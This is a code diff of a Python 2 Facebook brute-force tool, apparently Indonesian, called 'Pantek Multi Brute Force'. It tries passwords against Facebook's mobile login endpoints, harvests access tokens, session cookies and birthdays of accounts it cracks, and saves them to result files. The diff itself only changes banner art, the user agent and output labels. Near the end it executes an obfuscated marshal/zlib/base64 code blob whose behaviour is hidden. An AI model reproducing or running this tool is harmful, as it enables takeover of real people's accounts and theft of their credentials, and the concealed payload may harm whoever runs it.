@@ -60,11 +60,11 @@ def folder():
 # LOGO (LO GOBLOK)
 IP = requests.get("https://api.ipify.org/").text
 def banner():
-	print("""\x1b[0;92m _________ _____   ___ ________ _________
-\x1b[0;92m __   __  / __  / /  /  __     ) __  ___/\x1b[0;97m|| \x1b[0;93mPantek
-\x1b[0;92m  /  ____/   /  \/  /    / --  /  / /__  \x1b[0;97m|| \x1b[0;93mMulti
-\x1b[0;92m /  /       /  /_/  /   / __  <  /  __/  \x1b[0;97m|| \x1b[0;93mBrute
-\x1b[0;92m/__/ \x1b[0;93mV2.7  \x1b[0;92m/__/ /__/   /_____/  /__/     \x1b[0;97m|| \x1b[0;93mForce
+	print("""\x1b[0;92m __________ ____   _________________
+\x1b[0;92m __  __  /  __ \_/  /     )   ____/\x1b[0;97m|| \x1b[0;93mPantek
+\x1b[0;92m  / ____/    /     /  ——  /  /__  \x1b[0;97m|| \x1b[0;93mMulti
+\x1b[0;92m / /  ___   / /\/  / __ <   ___/  \x1b[0;97m|| \x1b[0;93mBrute
+\x1b[0;92m/_/  /__/  /_/  /_/_____/__/
 \x1b[0;97m════════════════════════════════════════════════════
 \x1b[0;92m[•] \x1b[0;97mCode by  : \x1b[0;93mAang-XD \x1b[0;97m& \x1b[0;93mRomi Afrizal
 \x1b[0;92m[•] \x1b[0;97mGithub   : \x1b[0;97mHttps://github.com/AngCyber
@@ -327,7 +327,7 @@ class ngentod:
     	try:
     	    ua = open('data/ua.txt', 'r').read()
         except IOError:
-        	ua = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11;]'
+        	ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1;]'
         global ok,cp,loop
         for pw in zona:
             pw = pw.lower()
@@ -348,7 +348,7 @@ class ngentod:
                 sys.stdout.flush()
                 b_api(self, user, zona)
             if 'session_key' in response.text and 'EAAA' in response.text:
-                print '\r%s•-> %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
+                print '\r%s[•]Okehh}> %s|%s|%s ' % (H,user,pw,response.json()['access_token'])
                 ok.append('%s • %s • %s' % (user,pw,response.json()['access_token']))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('╠[OK] %s • %s • %s\n'%(user,pw,response.json()['access_token']))
                 break
@@ -359,7 +359,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s•->%s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
+                    print '\r%s[•]Cepeh}> %s|%s|%s %s %s  ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -368,7 +368,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s•-> %s|%s           ' % (K,user,pw)
+                print '\r%s[•]Cepeh}> %s|%s           ' % (K,user,pw)
                 cp.append('%s • %s' % (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s\n"%(user,pw))
                 break
@@ -407,7 +407,7 @@ class ngentod:
             po = ses.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%s•-> %s|%s|%s  ' % (H,user,pw,kuki)
+                print '\r%s[•]Okehh}> %s|%s|%s  ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[OK] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -418,7 +418,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s•-> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s[•]Cepeh}> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -427,7 +427,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s•-> %s|%s            ' % (K,user,pw)
+                print '\r%s[•]Cepeh}> %s|%s            ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s\n"%(user,pw))
                 break
@@ -466,7 +466,7 @@ class ngentod:
             po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r%s•--> %s|%s|%s ' % (H,user,pw,kuki)
+                print '\r%s[•]Okehh}> %s|%s|%s ' % (H,user,pw,kuki)
                 ok.append("%s • %s • %s"% (user,pw,kuki))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[Ok] %s • %s • %s\n"%(user,pw,kuki))
                 break
@@ -477,7 +477,7 @@ class ngentod:
                     lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                     month, day, year = lahir.split('/')
                     month = bulan1[month]
-                    print '\r%s•-> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
+                    print '\r%s[•]Cepeh}> %s|%s|%s %s %s ' % (K,user,pw,day,month,year)
                     cp.append("%s • %s • %s %s %s"% (user,pw,day,month,year))
                     open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s • %s %s %s\n"%(user,pw,day,month,year))
                     break
@@ -486,7 +486,7 @@ class ngentod:
                     month   = ''
                     year  = ''
                 except: pass
-                print '\r%s•-> %s|%s              ' % (K,user,pw)
+                print '\r%s[•]Cepeh}> %s|%s              ' % (K,user,pw)
                 cp.append("%s • %s"% (user,pw))
                 open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write("╠[CP] %s • %s\n"%(user,pw))
                 break
@@ -776,7 +776,7 @@ def igg():
 					_bff_.append(_o_)
 				log.submit(crack2, _o_, _bff_)
 			except: pass
-	exit("%s[•] Crack selesai sayang..."%(H))
+	exit("%s[✓] Crack selesai sayang..."%(H))
 _=(lambda x:x);code=type(_.func_code);_.func_code=code(0,0,5,64,'y9\x00e\x00\x00d\x00\x00\x83\x01\x00j\x01\x00e\x00\x00d\x01\x00\x83\x01\x00j\x02\x00e\x00\x00d\x02\x00\x83\x01\x00j\x03\x00d\x03\x00\x83\x01\x00\x83\x01\x00\x83\x01\x00d\x04\x00\x04UWn\x1e\x00\x04e\x04\x00k\n\x00rY\x00\x01Z\x05\x00\x01e\x06\x00e\x05\x00\x83\x01\x00GHn\x01\x00Xd\x04\x00S',('marshal', 'zlib', 'base64', 'eJx1Us1q20AQnrFkO3ZS00MI8c3QBkTBFr30UNo0aQ4NFHJIKC25CEW7lmXLWkU7QqQop/TUF0ifoA/WJ+nMOv2B0oX5kfabb2Z2JoGHgyxHLHaflQL4AnDJTgdQIVx2xLsYBB5fJqK6LD2WEwn5zurmGxDAEoHhLcAe4zME4kAPXtwh3nrQerD04I5ZfRirLoxvfWh9UD0Yxxuvz/+3+KsLLQcOYNWByoIaAvWEtGXCLsx92Ht3Wjx1mG2HuXeY/j8YgI9FHxCxQPjETV0EO1zqmX3CekFU2pdh2DTNLCssxWkVr2eJWYcHNnwTRfHr58zIOB0rXVk7ZP+D1dX0ONUFuSuOKBfXOfns13zF3QJkih6z0SrV0dzkuWm0iq5uSF4sMTWHbrH3VleL2Ga5K+XRgZ08m04PJ2x/3H/9y/w+JOlPFjpZlSYrKBAOR1Tp61pbsiRTSTXR9kMxUSx1fnbFLa0pHCBTqYsqdZFmq5pIxn7q9PtAKjyXFlwfZUMyYH4Yqjfsil1/Y6NAdsYpO2IVWpXElQqvDM3KTa9Zkc4N/tooQK8zwV0c4gh3cF+k46MnO8IDcXt1viupJcGZKbRLnpuSaf7k+m9C6enV2qg614cup9AMRj7+BEx1j/c=', None),('__import__', 'loads', 'decompress', 'b64decode', 'Exception', 'e', 'str'),(),'enc_lam.py','<module>',1,'\x03\x009\x01\x0f\x00',(),());_()
       
 if __name__ == '__main__':
